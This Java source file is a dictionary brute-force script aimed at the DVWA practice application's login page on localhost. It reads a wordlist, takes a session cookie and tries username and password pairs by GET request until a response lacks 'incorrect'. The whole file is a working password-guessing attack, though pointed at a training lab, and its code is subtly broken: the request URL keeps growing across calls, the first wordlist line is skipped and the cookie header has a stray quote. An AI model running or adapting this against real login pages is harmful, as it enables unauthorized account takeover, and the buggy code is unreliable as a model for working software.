package com.company;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;

public class Main {
	public static String urlAdress= "http://localhost/vulnerabilities/brute/?username=";
	public static void main(String[] args) throws MalformedURLException {
		Boolean incorrect = true;
		String linePassword = null;
		String lineLogin = null;
		Scanner in = new Scanner(System.in);
		System.out.print("dictionary file path: ");
		String path = in.nextLine();
		System.out.print("cookies(PHPSSESID): ");
		String cookie = in.nextLine();
		try {
			File file = new File(path);
			FileReader frLogin = new FileReader(file);
			BufferedReader readerLogin = new BufferedReader(frLogin);
			lineLogin = readerLogin.readLine();
			while ((lineLogin != null)&&(incorrect == true)) {
				lineLogin = readerLogin.readLine();
				try{
					FileReader frPassword = new FileReader(file);
					BufferedReader readerPassword = new BufferedReader(frPassword);
					linePassword = readerPassword.readLine();
					while ((linePassword != null)&&(incorrect == true)) {
						linePassword  = readerPassword.readLine();
						incorrect = brute(lineLogin, linePassword, cookie);
						if(incorrect == true){
							System.out.println(lineLogin +" "+ linePassword + " incorrect");
						}
					}
				}
				catch(IOException ex){
					ex.printStackTrace();
				}
			}
		}
		catch(IOException ex){
			ex.printStackTrace();
		}
		if(incorrect == false){
			System.out.println(lineLogin +" "+ linePassword +" CORRECT!");
		}
	}
	static boolean brute(String _user, String _password, String cookie){
		URL url;
		String user = _user;
		String pass = _password;
		urlAdress += user+"&password="+pass+"&Login=Login";
		try {
			url = new URL(urlAdress);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();

			conn.setRequestMethod("GET");
			conn.setRequestProperty("Cookie", "PHPSESSID="+cookie+"\""+";security=low");
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");


			String line;
			BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			while ((line = reader.readLine()) != null) {
				if(line.contains("incorrect")){
					return true;
				}
			}
			reader.close();
			return false;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
}
